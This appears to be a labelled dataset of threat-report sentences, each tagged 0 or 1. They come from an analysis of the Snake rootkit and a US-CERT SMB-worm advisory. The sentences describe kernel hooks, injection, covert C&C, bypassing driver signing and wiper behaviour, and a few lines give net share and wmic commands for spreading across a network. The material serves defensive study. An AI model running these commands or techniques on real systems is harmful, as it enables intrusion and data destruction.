The purpose of this DLL is to be injected into the user-mode processes .	1
Some variants of Snake carry the DLL modules that can be installed as a service , to be run within taskhost.exe or services.exe processes .	1
Next , the driver sets up the hooks for the following kernel-mode APIs : After that , it calls PsSetCreateProcessNotifyRoutine ( ) in order to be notified whenever a new process is started .	1
The handlers of the hooks above along with the notification callback allow Snake to stay persistent on a system , being able to infect any newly created processes , and restore its driver file in case it gets deleted .	1
Another set of hooks it sets is designed to hide the presence of the Snake components on the system : The driver then watches for all userland processes to see if they load any web pages .	1
As long as the user is not using the Internet , Snake stays dormant too , as there is no process that communicates with the web servers .	1
However , as soon as the user goes online , the driver intercepts that event and then immediately injects the malicious DLL module into the process that initiated connection ( the browser ) .	1
Once injected , the module initiates polling from one of the hard-coded C & C servers .	1
The purpose of this behaviour is to blend Snake 's traffic with the browser traffic , bypassing the firewalls , and keeping a low profile at the same time .	1
By communicating from within a process that also communicates , even a technically savvy user will find it challenging to detect Snake traffic among legitimate traffic .	0
The reason behind such difficulty is because modern web pages often fetch pages from the different web servers , including such data as additional scripts , CSS templates , advertising contents , analytics data , blogs , social networking data , etc .	0
When intercepted with the purpose of analysis , such traffic may literally represent itself hundreds of DNS and HTTP requests made when a popular website , such as a news website is open .	0
Hiding a few DNS/HTTP requests among busy network traffic allows Snake rootkit to stay unnoticed .	1
In order to test Snake 's communications with the C & C servers , and still being able to clearly distinguish its traffic , a small tool was built to generate GET request to a web server running on the analysed system .	0
The tool was named as chrome.exe in order to trigger the malware communications .	0
As long as the test tool named chrome.exe did not make any requests , its memory stayed pristine .	0
There were no injections made by the driver .	0
As soon as the tool made its first GET requests , the driver immediately injected a malicious DLL module in it , and that module started producing the following traffic : ↓ The domain names of the C & C servers it relies on are hard-coded in the body of the malware .	1
Some examples are given below , and a full list of known domains is given in the Appendix D : As seen in the traffic dump above , the malware first resolves the domain name of its C & C .	1
Next , it fetches a file /D/pub.txt , and expects the server to respond with a string '' 1 '' , acknowledging it 's active : Once acknowledged , it asks the server for a command , and the server returns a new command to execute : The command it receives from C & C above ( swim.onlinewebshop.net ) is encrypted .	1
In order to decrypt it , the malware first applies the XOR mask to the bytes that start from offset 0x40 : An identical XOR mask was also used by Agent.BTZ .	1
Next , it calculates and confirms a CRC32 checksum within the command , further decrypts the data by using the Number Theory Library ( NTL ) , and makes sure the command is destined to the current host by matching the ID field in it .	1
Once decrypted , the malware interprets the received command , as reflected in the malware log below ( the new C & C server address is highlighted in it ) : After that , the malware connects to the new C & C , asking it for another command : The command it receives is called UpLoad , so it uploads all the collected logs to the server , and then cleans out those logs : The files it uploads are stored inside its home directory % windows % \ $ NtUninstallQ [ random ] $ , where [ random ] is a random number .	1
For example , Snake 's home directory could be C : \WINDOWS\ $ NtUninstallQ812589 $ .	0
The files within that directory are used by the rootkit to store configuration and log data .	1
When decrypted with the same XOR key that was used by Agent.BTZ , these files expose the following contents : Analysis of the sample reveals that it supports 3 modes of fetching C & C commands .	1
• In the first mode , it relies on Windows Internet ( WinINet ) APIs , such as HttpOpenRequest ( ) , HttpSendRequest ( ) , InternetReadFile ( ) , etc .	1
• In the second mode , it uses Windows Sockets 2 ( Winsock ) APIs , such as WSAStartup ( ) , socket ( ) , connect ( ) , send ( ) , etc .	1
• In the third mode , it works in the 'pipe server ' mode , when it passes the web requests it is interested in ( as a client ) to the pipe server that runs within Windows Explorer ( explorer.exe ) and/or Internet Explorer ( iexplore.exe ) processes .	1
Memory pipes is a common mechanism for Inter-Process Communications ( IPC ) .	0
When the pipe server reads such requests from the pipes , it performs the web request on behalf of a client by using WinINet APIs , so it effectively serves as a proxy .	0
The diagram below demonstrates the last , 'pipe server ' mode of Snake operation : The diagram illustrates the operation steps 1-4 : 1 First , the malicious driver with the embedded DLL module injects that DLL into a system process , such as services.exe ; once loaded , the DLL will function in the 'pipe server ' mode .	1
2 As soon as the driver detects a usermode process that goes online ( e.g . a browser ) , it will inject malicious DLL module into it ; depending on the operational mode , the DLL may start communicating with C & C directly .	1
3 In the 'pipe mode ' of operation , the injected DLL will start communicating with the pipe server by sending messages into the established inter-process communication pipes .	1
4 Once the task of communication with C & C is delegated to the pipe server , it will start communicating with the C & C , bypassing the host-based firewalls that keep an infected system process in a white-list .	1
The reason behind the pipes usage is to 'legitimise ' the outbound web requests , forcing them to originate from the host firewall- friendly system services .	1
Pipe server is a special mode of the injected DLL .	0
In order to switch into that mode , a dedicated thread is spawned to listen for IPC messages received through the pipes .	1
The memory pipes used by Snake are named as : Apart from GET / POST requests , the pipe clients ( infected usermode processes ) may also ask the pipe server to perform other operations on their behalf , such as saving data into a temporary file , copy / delete files , save configuration data into the registry under the aforementioned ShellCore value .	1
This delegation of tasks is designed to keep infected processes under the radar of the behavioural analysis tools for as long as possible .	1
Another reason is to overcome account restrictions imposed on a browser process in order to be able to write into files / registry .	1
To delegate different types of tasks , the clients send messages to the pipe server using the following task identification headers : The usermode component of Snake communicates with its kernel-mode driver via a device called \\.\vstor32 ( created under kernel as \Device\vstor32 ) .	1
In its communication protocol with the driver it uses the IOCTL code of 0x222038 .	0
To write data , it opens the device with CreateFile ( '' \\.\vstor32 '' ) , then calls DeviceIoControl ( ) API on its handle with IOCTL code of 0x222038 .	1
Configuration parameters along with the initial set of domain names are hard-coded within the body of the DLL .	1
However , the data appears to be defined in the structures , so it is very likely the DLL could be generated by a stand-alone builder that 'patches ' the DLL with the new/updated list of C & C .	0
Analysis of the commands performed by the malware suggests the following capabilities : Together , these commands provide complete backdoor functionality , allowing remote attacker full control over the compromised system .	1
The ability to update the driver and then rely on its communication capabilities means that the components of Snake are flexible , making possible the existence of the hybrid ( kernel-centric and usermode-centric ) architectures .	1
For example , the virtual partitions are used by kernel-centric Snake variants , where the kernel-mode driver is responsible for the communications .	1
If such a driver is installed via an update , the usermode component can be instructed to delegate the file upload task to the driver by copying all the necessary logs into the shared virtual partition , physically located on the compromised host and thus , accessible from kernel .	1
This particular architecture relies on a kernel-mode driver to carry out the network communications .	1
The usermode DLLs are still injected into the system processes to perform high-level tasks .	1
The delivery mechanism is not known : it may be distributed via a thumb-drive , a phishing email attachment , or be delivered via an exploit across the network ( e.g .	1
by using the reconnaissance tool that is explained later ) .	0
Infection starts from a dropper penetrating into the compromised system where it is allowed to run .	1
Once executed , the dropper installs the kernel mode driver in a pre-defined location .	1
The dropper itself is 32-bit , so it will run both on 32-bit and 64-bit Windows OS ( in WoW64 mode ) .	0
On a 32-bit OS , it will install a 32-bit driver .	1
On a 64-bit OS , it will install a 64-bit driver .	1
The analysed 32-bit dropper creates a driver in the following location : However , different samples may use a different path and driver file name .	1
For example , some samples exposed these filenames : fdisk32.sys , A0009547.sys , or Ultra3.sys .	0
The filename of the dropper could be rknginst.exe or fdiskmon.exe .	0
Once executed , the driver first makes sure it is registered under a pre-defined name , such as Ultra3 .	0
Other samples may have a different registration name , such as ~ROOT .	0
The registration is ensured with creation of the following registry entries : The driver then flags the following events with the notification purposes : The rootkit then places a number of the hooks .	1
The first API it hooks is IoCreateDevice ( ) .	1
The installed hook handler calls the original API and then checks if the name of the device is netbt or afd .	1
If so , it will install a TDI filter driver .	1
If the device name is Null , Beep , tcpip or Nsiproxy , it will activate itself by enabling its hooks designed to hide the presence of Snake on a system , set up its access control lists and the messaging system .	1
In order to hide its components , the driver hooks the following APIs : For example , the hook handlers of the registry-related APIs will block access to the registry entries that contain the name of the driver .	1
In one example , the rootkit blocks access to registry entries that contain the strings '' Ultra3 '' and '' ~ROOT '' .	1
The ZwReadFile ( ) hook handler will block access to the home directory where the rootkit keeps its file .	1
In one of the analysed kernel-centric Snake samples the home directory was hard-coded as % windows % \ $ NtUninstallQ817473 $ , so it blocked file read access from that directory .	1
The ZwClose ( ) hook handler is used to inject the DLL module into the userland processes .	1
The hook handler for ZwTerminateProcess ( ) checks if the process being shut down is svchost.exe .	1
If so , it considers it to be a system shutdown , so it unloads its usermode DLL and deactivates its own network drivers , just like it does when its ZwShutdownSystem ( ) hook handler gets invoked .	1
The ObOpenObjectByName ( ) hook is designed to hide the presence of its virtual partitions ( described later ) .	1
To encrypt data stored on its virtual partitions , the driver sets a hook for another API : To re-infect the usermode process svchost.exe and to re-enable its network drivers , the rootkit hooks these APIs : Snake then proceeds to the task of deep packet inspection and modification .	1
In order to accomplish it , it registers a callout driver for Windows Filtering Platform ( WFP ) , an architecture first introduced with Windows Vista and nowadays normally used by antivirus and/or intrusion detection systems to inspect/block malicious traffic .	1
Snake sets filters at the layers FWPMLAYERSTREAMV4 and FWPMLAYERALEFLOWESTABLISHEDV4 in the TCP/ IP stack , so that its callout driver is notified whenever a TCP connection is established by a browser .	1
When that happens , the rootkit triggers an event named \BaseNamedObjects\wininetactivate .	1
When the data arrives , it is intercepted with the FwpsCopyStreamDataToBuffer0 ( ) API , and then scanned for the presence of the hidden commands from C & C .	1
The driver inspects bidirectional network data on a per stream basis , as it 's located right on the stream data path .	1
An ability to manipulate data streams is provided with the packet injection logic below , allowing Snake to covertly insert traffic destined to its C & C servers : In order to qualify as a browser , the usermode process must have any of the following names : In addition to WFP , Snake also hooks the Transport Driver Interface ( TDI ) network routines by setting itself up as a TDI filter driver .	1
TDI is considered deprecated and will be removed in future versions of Microsoft Windows , but it 's still supported on Windows 7 .	0
Being registered as a TDI driver on the device stack , Snake hooks TCP calls .	1
This way it intercepts all requests along with their parameters via IRP ( IO request package ) hooks .	1
By 'sniffing ' all the requests , it can now inspect the traffic , looking for and then parsing GET / POST HTTP requests and also SMTP communications , in order to distinguish commands addressed to itself .	1
If the rootkit detects that the OS version is pre-Vista ( e.g . Windows XP ) or Windows Server 2008 ( e.g . Windows Server 2003 ) , it will invoke FwpsStreamInjectAsync0 ( ) API in order to generate outbound requests .	1
Whenever the client establishes connections , the TDI driver will also 'pulse ' the \BaseNamedObjects\wininetactivate event , just like the WPF driver 's component of it , in order to notify the userland service about the event .	1
The data that the driver intercepts , along with the important notifications , is passed to the userland DLL to be processed .	1
If the data contains commands from C & C , the DLL module is expected to execute them and report results back to the driver to be delivered back to C & C .	1
For NDIS versions 5.X , Snake rootkit contains code that installs NDIS filter intermediate driver .	1
This driver is set up above a miniport driver ( a driver that communicates with the physical device ) and below a protocol driver ( a driver that implements a protocol , e.g .	1
TCP/IP ) .	0
The driver is registered with NdisIMRegisterLayeredMiniport ( ) API .	1
After that , the drivers hooks the following exports within ndis.sys : The rootkit contains code that installs NDIS filter driver for NDIS 6.0 and above : NDIS filter driver configuration is stored in the registry entry : The driver is registered with NdisFRegisterFilterDriver ( ) API .	1
After that , the drivers hooks the following exports within ndis.sys ( for NDIS 6.0 ) : Another set of exports it attempts to hook in ndis.sys ( for NDIS 6.0 ) is : With the hooks installed , whenever the network adapter driver attempts to register to NDIS , or whenever there is an attempt to install NDIS intermediate driver or NDIS filter driver , the hook handlers will register Snake 's own MiniportXxx functions with the NDIS library .	1
With its own miniport handler functions , it can send / receive data by using a private TCP/IP stack , bypassing all firewall hooks , and making its open ports invisible to scanners .	1
The Snake rootkit registers itself as Network Driver Interface Specification ( NDIS ) protocol driver .	1
Whenever the underlying miniport driver receives data from the network , it calls NDIS by invoking a data receive indication function NdisMIndicateReceiveNetBufferLists ( ) .	1
When that happens , NDIS invokes Snake 's hook function ( ProtocolReceiveNetBufferLists ) to process the received data .	1
To send the data back , the protocol driver defines the data in a list of NETBUFFERLIST structures , and then passes them to NDIS by calling NdisSendNetBufferLists ( ) .	1
NDIS , in turn , calls the miniport driver's MiniportSendNetBufferLists ( ) function to forward the data to an underlying miniport driver .	1
Being able to fully manipulate traffic at 3 different levels ( NDIS protocol driver , TDI Driver , and WPF callout driver ) , Snake is able to 'inject ' the traffic into existing communications to reach out to external components , and at the same time parse all incoming traffic to detect traffic addressed to itself : As the driver intercepts all connections ( e.g .	1
on TDIRECEIVE TDI event or ClientEventReceive ( ) event notification triggered through its TDI Filter Driver ) , it parses all incoming HTTP and SMTP traffic to see if it can be authenticated as Snake traffic .	1
The authentication is implemented by decrypting the data and making sure it starts with the markers 0xDEADBEAF and 0xC001BA5E ( which appear to derive from 'DEAD BEEF ' and 'COOL BASE ' ) .	1
Here are specific steps : By observing such behaviour , one might wonder why the driver is expecting HTTP or SMTP clients ? Why does it act like HTTP/SMTP server processing client traffic , and serving back normal responses as per the protocol ? For example , in HTTP the driver will respond with messages like '' HTTP/1.1 200 OK '' or '' HTTP/1.1 500 Server Error '' .	1
For SMTP traffic , it communicates back normal SMTP server responses , such as '' 250 Sender OK '' , '' 503 Bad sequence of commands '' , etc .	0
The reason behind such behaviour is that the driver is acting in this mode like a proxy , routing requests from other infected hosts to a remote C & C server .	1
Another opportunity this mode unlocks is a peer-to-peer network mode with no centralised C & C .	0
The infected hosts are capable of transferring the following peer-2-peer commands defining fragment size , reliability parameters , new peer information , peer impersonation flags , etc .	0
: Once the incoming data is authenticated and decrypted , the driver passes it to the DLL by using memory pipes .	1
For example , on HTTP traffic arrival it may send traffic data into a memory pipe \Device\NamedPipe\isapihttp , and then , send a received peer-2-peer command message writepeernfo= [ IPADDRESS : PORT ] 0fragnoscrambling=Y0 into another memory pipe called \Device\NamedPipe\isapidg .	1
In order to log its activity , the driver writes log data into the pipe \Device\NamedPipe\isapilog , so that the DLL could log the data into the log files .	1
Full list of the named pipes used for communications is provided below : Messages submitted into the pipes are wrapped into the structures .	1
The structures appear to contain headers to allow the pipe server , that runs within an infected userland module , to identify the messages first and then unwrap the structures accordingly .	1
For example , the message headers could be : Once received from the pipes and unwrapped/decoded , the data is then handled by the usermode DLL as per the data intention - whether it 's a traffic sniffing task , a peer-2-peer client logic , a logging task , or a task of saving received files into the virtual volumes .	1
The driver creates virtual file volumes for encrypted storage of its files and configuration data : The volumes are mounted from the virtual file systems RawDisk1 and RawDisk2 .	1
The first partition is created with the following steps : The hook installed by the rootkit on IofCallDriver ( ) API provides on-the-fly data encryption/decryption whenever that data is written to or read from the volume .	1
The encryption algorithm is based on CAST-128 , with the hard-coded key stored in the rootkit body .	1
As a result , whenever the data is saved into the volume Hd1 , it will be scrambled on-the-fly , and reflected in the persistent storage file hotfix.dat , which is physically located within the rootkit 's 'home ' directory : Analysis of the hotfix.dat file contents reveals it 's a fully encrypted file with flat entropy .	1
Thus , it is not possible to reveal the contents of the Snake 's volume by accessing the contents of this file ( unless the encryption is broken , that is ) .	0
Enlisting the contents of the created volume is possible , along with creating files on it : However , as soon as IofCallDriver ( ) hook is removed , the same 'dir ' command will fail , as with no hook the rootkit can not decrypt the scrambled volume : The second volume \\.\Hd2 is not mapped to a file , so when a computer is switched off , its contents is lost .	0
Thus , it could be used as a temporary or a cache storage .	0
The data stored in \\.\Hd2 is encrypted the same way the first volume 's data .	1
Both volumes appear to be set up as FAT volumes .	1
An attempt to read the data from these volumes with the code below : This will produce the following results : For \\.\Hd1 : For \\.\Hd2 : The ability to keep its data on TrueCrypt-like volumes provides Snake with a powerful ability to exchange data with the usermode DLL , as these volumes are accessible both from usermode and kernel mode .	1
Static analysis of the code reveals that the Snake driver uses virtual volumes to store its data and additional files on it .	1
For example , it stores its message queue in a file called : The message queue indicates an asynchronous communication model between kernel mode driver and a usermode DLL , e.g .	1
to pass commands , configuration parameters , binary images of additional Snake components .	0
Other files that may also be found on the virtual volume are : klog , conlog , dump , rknginst.exe , where rknginst.exe could be the name of the original dropper , and other log files could potentially contain executed command outputs , intercepted keystrokes , and other output logs .	1
The 64-bit version of Snake must deal with a number of additional security protections implemented in 64-bit editions of Microsoft Windows , the most significant of which are kernel driver signature validation and Kernel Patch Protection ( more commonly known as PatchGuard ) .	0
PatchGuard is a feature of 64-bit Windows which aims to prevent modification of the Windows kernel , something that is often performed by malware attempting to hide itself on an infected system .	0
Although PatchGuard is successful at preventing kernel patching once initialised , several published bypass approaches exist , .	0
The technique used by Snake appears to be similar to these approaches .	0
The driver signing policy enforced by all 64-bit versions of Windows from Vista onwards requires all kernel-mode drivers to be signed with a valid digital signature .	0
The Snake dropper contains both 32-bit and 64-bit unsigned drivers , and it can successfully load its unsigned 64-bit driver on a 64-bit version of Windows XP – as driver signing is not enforced it does not have to resort to any tricks under this OS version .	1
In this case , in order to ensure the driver is loaded automatically at startup , the dropper can install the 64-bit driver on 64-bit Windows XP in the same way it installs a 32-bit driver on a 32-bit version of Windows XP .	1
On 64-bit versions of Windows Vista and above it behaves differently .	1
Firstly , the 64-bit unsigned driver file is created as usual : However , the driver is not registered ; what is registered instead is the dropper itself .	1
To do that , the dropper first copies itself as : The dropper then registers itself as a service to ensure it starts every time Windows is booted , by creating the values : Now comes the most interesting part : does the dropper manage to load its 64-bit unsigned driver under 64-bit versions of Windows Vista and later versions , such as 64-bit Windows 7/8 ? The answer : Yes , it does .	1
Does it resort to using bootkit technology , which has been used in the past to bypass protections to load unsigned 64-bit drivers ? The answer : No .	0
Bootkits must overwrite the Master Boot Record ( MBR ) and antivirus products are well trained to catch that kind of bad behavior .	0
The masterminds behind Snake rootkit seem to be well aware of this so what they resorted to instead is leveraging a vulnerability in a well-known virtualization product called VirtualBox , a product made by Oracle which is widely used by researchers to analyse malware .	0
VirtualBox driver version 1.6.2 was released in June 2 , 2008 .	0
Two months later , in August 2008 , security researchers reported that its main driver component , which is signed under the entity '' innotek Gmbh '' , contained a privilege escalation vulnerability .	0
In a nutshell , the VirtualBox software installs a driver called VBoxDrv .	0
The driver is controlled with the Input/Ouput Control Codes ( 32-bit values called IOCTL ) passed along DeviceIoControl ( ) API .	0
One of the documented transfer methods that the system uses to pass data between the caller of DeviceIoControl ( ) API and the driver itself is called METHODNEITHER .	0
As per MSDN documentation , METHODNEITHER is a special transfer type when Input/Output Request Packet ( IRP ) supplies the user-mode virtual addresses of the input and output buffers , without validating or mapping them .	0
It is the responsibility of the driver to validate the addresses sent from user mode in order to make sure those addresses are valid usermode addresses .	0
The source code of the vulnerable driver ( shown below ) demonstrates how the integer value of the rc variable is first derived from the input parameters pDevObj ( device object ) and pIrp ( request packet ) .	0
Next , that integer value is written into the UserBuffer - an arbitrary address , pointed by the input parameter pIrp ( request packet ) .	0
As there are no validations made for the UserBuffer an attacker can craft such input parameters that will define address within kernel memory to patch and the data to patch it with : Now that the vulnerable driver can be used as a weapon to patch kernel memory , all the malware needs to do is to patch the content of the variable nt ! gCiEnabled , a boolean variable '' Code Integrity Enabled '' that marks whether the system was booted in WinPE mode .	1
When running in WinPE mode there is no Code Integrity control , therefore by enabling this mode by patching only one bit , Code Integrity verification is disabled so that the unsigned 64-bit driver can be loaded .	1
This variable is used within the function SepInitializeCodeIntegrity ( ) , implemented within CI.dll 's function CiInitialize ( ) and imported by the NT core ( ntoskrnl.exe ) .	0
In order to find the variable in kernel memory , the Snake dropper loads a copy of the NT core image ( ntoskrnl.exe ) , locates the import of CI.dll 's function CiInitialize ( ) , and then SepInitializeCodeIntegrity ( ) within it .	1
Then it parses the function 's code to locate the offset of the variable .	1
Once located , the content of the variable nt ! gCiEnabled is patched in kernel memory and the 64-bit unsigned driver is loaded .	1
This explains why Snake dropper registers itself as a service to start each time Windows starts : in order to install the vulnerable VBox driver first , then pass it a malformed structure to disable Code Integrity control with a DeviceIoControl ( ) API call , and finally , load the driver .	1
In order to be able to perform the steps above , the dropper must first obtain Administrator privileges .	1
It attempts to do this by running MS09-025 and MS10-015 exploits on the target system .	1
These exploits are bundled within the dropper in its resource section as executable files .	0
Other resources embedded within the dropper are the 32-bit and 64-bit builds of its driver , a tool for creating NTFS file systems , and the initial message queue file which is written into the virtual volume .	1
The message queue file contains configuration data and the libraries that will be injected into usermode processes .	1
The usermode DLLs injected by the kernel-mode driver into the userland system process ( e.g .	1
explorer.exe ) are : The rkctlWin32.dll/rkctlx64.dll module uses the following hard-coded named pipe for communications : The remote commands it receives appear to be designed to control other components of Snake : The injsnakeWin32.dll/injsnakex64.dll module exports 61 functions .	1
It is designed to perform the high-level tasks such as : When the DLL activates , it reads configuration parameters from the configuration queue , that the driver creates on a virtual volume .	1
One of the parameters defines the pipe name ( s ) that the DLL should use for its communications .	1
The remote commands received by this Snake DLL module are designed to set up various communication parameters : To post the data , the DLL can use the following User-Agent string '' Mozilla/4.0 ( compatible ; MSIE 6.0 ) '' .	1
It may rely on the following Internet Media types ( MIME types ) for data exfiltration : Request type it uses can either be POST of GET , and C & C server resource name is /default.asp .	1
One of the Snake components that could have been downloaded from a remote C & C server , was identified as a network reconnaissance tool .	1
When run as a command line tool , with its logic defined with the command line switches , this tool enumerates other network hosts and detects what Windows RPC services are enabled at the endpoints .	1
It carries a list of interface identifiers associated with the named pipes .	1
It then uses these identifiers to write a message to and read a message from the associated named pipes .	1
By knowing what RPC services are running , it can successfully fingerprint all network hosts by mimicking the Metasploit 's logic of OS fingerprinting via SMB .	1
The fingerprinting allows it to reveal the following characteristics for each host found in the network : The data it retrieves is encrypted and saved into a configuration file % system % \vtmon.bin .	1
This file is then further encrypted with an NTL-based ( Number Theory Library ) algorithm and is uploaded by the usermode-centric Snake rootkit to the C & C server , along with other configuration files , such as mtmon.sdb , mtmon32.sdb , gstatsnd.bin , gstat.bin , gstat32.bin , and other log files found in the % windows % \ $ NtUninstallQ [ random ] $ directory .	1
By using this function the remote attacker can identify any potentially exploitable hosts located in the same network as the victim .	1
The attacker may then craft an exploit against those hosts , possibly by using the Metasploit framework , and then deliver the generated shellcode back to the reconnaissance tool to be applied against the identified hosts by running the tool with the 'expos ' switch .	1
If the tool successfully delivers the payload and exploits the remote host ( s ) , it will replicate the infection across the network , taking control over new hosts , thus repeating the infection cycle all over again and spreading the infection further .	1
Unlike traditional worm techniques , this process is rather manual , but its danger is in the fact that the attacker can flexibly craft new attack methods , adjusting them to the hosts present within the network , thus preying on the weakest ( least updated , most vulnerable ) victims along its path .	1
As seen from the check-in logs found within one of the recent samples , the time span covers almost 6 years from January 2007 till December 2012 , which is aligned with the first reports of Agent.BTZ .	0
It 's worth noting that Agent.BTZ used the same XOR key for its logs as the most recent variants : Log files created by the latest samples of Snake , compiled in 2013 and 2014 , were successfully decrypted with the same XOR key .	1
Other similarities include the usage of the virtual partition \\.\Vd1 , the temporary file named FA.tmp , usage of files named mswmpdat.tlb , wmcache.nld , winview.ocx .	0
The cyber-espionage operation behind the Snake rootkit is well established , a sample comiled in January 2006 indicates that the activity would have begun in at least 2005 .	0
It is also sophisticated , using complex techniques for evading host defences and providing the attackers covert communication channels .	1
Toolmarks left behind by the authors 'vlad ' & 'gilg ' , leave tantalizing clues as to the personas behind this .	0
From a technical perspective , Snake demonstrates two very different approaches to the task of building a cyber-espionage toolkit .	0
One approach is to delegate the network communication engine to usermode code , backed up by a usermode rootkit .	1
Another approach is to carry out all of the communications from the kernel-mode driver , which is a very challenging task by itself .	1
The complexity of the usermode-centric approach is on par with Rustock rootkit - it uses similar techniques .	0
It 's an old well-polished technology that evolved over the years and demonstrated its resilience and survivability under the stress of security counter- measures .	0
The complexity of the kernel-centric architecture of Snake is quite unique .	0
This architecture is designed to grant Snake as much flexibility as possible .	0
When most of the infected hosts are cut off from the outside world , it only needs one host to be connected online .	1
The traffic is then routed through that host to make external control and data exfiltration still possible .	1
The presence of the reconnaissance tool in the Snake operators ' framework suggests the existence of an arsenal of infiltration tools , designed to compromise a system , then find a way to replicate into other hosts , infect them , and spread the infection even further .	1
As demonstrated , the backdoor commands allow Snake to provide remote attackers with full remote access to the compromised system .	1
Its ability to hibernate , staying fully inactive for a number of days , makes its detection during that time very difficult .	1
The analysed code suggests that even file system and registry operations can be delegated by an infected module to another module in order to stay unnoticed by behaviour analysis engines of the antivirus products , and to overcome account restrictions of the browser processes so that the injected module could still write into files and into the sensitive registry hives .	1
The logs and dumps it creates on the hidden virtual volumes contributes to its stealthiness too .	1
A great deal of attention has also been given to keep its network communications as quiet as possible .	1
Its ability to generate malicious traffic whenever the user goes online and start loading the web pages allows it to 'blend in ' with the legitimate communications .	1
We expect much more will be uncovered by researchers in the coming weeks as the capabilities of this operation are further fleshed out .	0
However , as we implied in the opening section , we view this threat to be a permanent feature of the landscape .	0
Whether they dismantle this toolset and start from scratch , or continue using tools which have been exposed , remains to be seen .	0
For their targets though the considerable challenge of keeping secrets safe on sensitive networks will certainly continue for years to come .	0
Original release date : December 19 , 2014 Microsoft Windows US-CERT was recently notified by a trusted third party of cyber threat actors using a Server Message Block ( SMB ) Worm Tool to conduct cyber exploitation activities recently targeting a major entertainment company .	0
This SMB Worm Tool is equipped with a Listening Implant , Lightweight Backdoor , Proxy Tool , Destructive Hard Drive Tool , and Destructive Target Cleaning Tool .	1
SMB Worm Tool : This worm uses a brute force authentication attack to propagate via Windows SMB shares .	1
It connects home every five minutes to send log data back to command and control ( C2 ) infrastructure if it has successfully spread to other Windows hosts via SMB port 445 .	1
The tool also accepts new scan tasking when it connects to C2 .	1
There are two main threads : the first thread calls home and sends back logs ( a list of successful SMB exploitations ) , and the second thread attempts to guess passwords for SMB connections .	1
If the password is correctly guessed , a file share is established and file is copied and run on the newly-infected host .	1
Listening Implant : During installation of this tool , a portion of the binaries is decrypted using AES , with a key derived from the phrase '' National Football League .	0
'' Additionally , this implant listens for connections on TCP port 195 ( for '' sensvc.exe '' and '' msensvc.exe '' ) and TCP port 444 ( for '' netcfg.dll '' ) .	1
Each message sent to and from this implant is preceded with its length , then XOR encoded with the byte 0x1F .	1
Upon initial connection , the victim sends the string , '' HTTP/1.1 GET /dns ? \x00 . '' The controller then responds with the string '' 200 www.yahoo.com ! \x00 '' ( for '' sensvc.exe '' and '' msensvc.exe '' ) or with the string '' RESPONSE 200 OK ! ! '' ( for '' netcfg.dll '' ) .	1
The controller sends the byte '' ! '' ( 0x21 ) to end the network connection .	1
This special message is not preceded with a length or XOR encoded .	0
Lightweight Backdoor : This is a backdoor listener that is designed as a service DLL .	1
It includes functionality such as file transfer , system survey , process manipulation , file time matching and proxy capability .	1
The listener can also perform arbitrary code execution and execute commands on the command line .	1
This tool includes functionality to open ports in a victim host 's firewall and take advantage of universal Plug and Play ( UPNP ) mechanisms to discover routers and gateway devices , and add port mappings , allowing inbound connections to victim hosts on Network Address Translated ( NAT ) private networks .	1
There are no callback domains associated with this malware since connections are inbound only on a specified port number .	0
Proxy Tool : Implants in this malware family are typically loaded via a dropper installed as a service , then configured to listen on TCP port 443 .	1
The implant may have an associated configuration file which can contain a configurable port .	0
This proxy tool has basic backdoor functionality , including the ability to fingerprint the victim machine , run remote commands , perform directory listings , perform process listings , and transfer files .	1
Destructive Hard Drive Tool : This tool is a tailored hard-drive wiping tool that is intended to destroy data past the point of recovery and to complicate the victim machine 's recovery .	1
If the CNE operator has administrator-level privileges on the host , the program will over-write portions of up-to the first four physical drives attached , and over-write the master boot record ( MBR ) with a program designed to cause further damage if the hard drive is re-booted .	1
This further results in the victim machine being non-operational with irrecoverable data .	1
( There is a caveat for machines installed with the windows 7 operating system : windows 7 machines will continue to operate in a degraded state with the targeted files destroyed until after reboot , in which the infected MBR then wipes the drive .	1
) If the actor has user-level access , the result includes specific files being deleted and practically irrecoverable , but the victim machine would remain usable .	1
Destructive Target Cleaning Tool : This tool renders victim machines inoperable by overwriting the Master Boot Record .	1
The tool is dropped and installed by another executable and consists of three parts : an executable and a dll which contain the destructive components , and an encoded command file that contains the actual destruction commands to be executed .	1
Network Propagation Wiper : The malware has the ability to propagate throughout the target network via built-in Windows shares .	1
Based on the username/password provided in the configuration file and the hostname/IP address of target systems , the malware will access remote network shares in order to upload a copy of the wiper and begin the wiping process on these remote systems .	1
The malware uses several methods to access shares on the remote systems to begin wiping files .	1
Checking for existing shares via '' \\hostname\admin $ \system32 '' and '' \\hostname\shared $ \system32 '' or create a new share '' cmd.exe /q /c net share shared $ = % SystemRoot % /GRANT : everyone , FULL '' .	1
Once successful , the malware uploads a copy of the wiper file '' taskhostXX.exe '' , changes the file-time to match that of the built-in file '' calc.exe '' , and starts the remote process .	1
The remote process is started via the command '' cmd.exe /c wmic.exe /node : hostname /user : username /password : pass PROCESS CALL CREATE '' .	1
Hostname , username , and password are then obtained from the configuration file .	0
Afterwards , the remote network share is removed via '' cmd.exe /q /c net share shared $ /delete '' .	1
Once the wiper has been uploaded , the malware reports its status back to one of the four C2 IP addresses .	1
Technical and strategic mitigation recommendations are included in the Solution section below .	0
US-CERT recommends reviewing the Security Tip Handling Destructive Malware # ST13-003 .	0
Cyber threat actors are using an SMB worm to conduct cyber exploitation activities .	0
This tool contains five components – a listening implant , lightweight backdoor , proxy tool , destructive hard drive tool , and destructive target cleaning tool .	1
The SMB worm propagates throughout an infected network via brute-force authentication attacks , and connects to a C2 infrastructure .	1
Due to the highly destructive functionality of this malware , an organization infected could experience operational impacts including loss of intellectual property and disruption of critical systems .	0
Users and administrators are recommended to take the following preventive measures to protect their computer networks : Use and maintain anti-virus software – Anti-virus software recognizes and protects your computer against most known viruses .	0
It is important to keep your anti-virus software up-to-date ( see Understanding Anti-Virus Software for more information ) .	0
Keep your operating system and application software up-to-date – Install software patches so that attackers ca n't take advantage of known problems or vulnerabilities .	0
Many operating systems offer automatic updates .	0
If this option is available , you should enable it ( see Understanding Patches for more information ) .	0
Review Security Tip Handling Destructive Malware # ST13-003 and evaluate their capabilities encompassing planning , preparation , detection , and response for such an event .	0
Review Recommended Practices for Control Systems , and Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies ( pdf ) .	0
The following is a list of the Indicators of Compromise ( IOCs ) that can be added to network security solutions to determine whether they are present on a network .	0
The malware has the following characteristics : While the original filename of this file is unknown , it was likely '' diskpartmg16.exe '' .	0
This file serves as a dropper .	1
It drops destructive malware : '' igfxtrayex.exe '' .	1
When the dropper file was executed , it started a second instance of itself with '' -i '' as an argument , and then terminated .	1
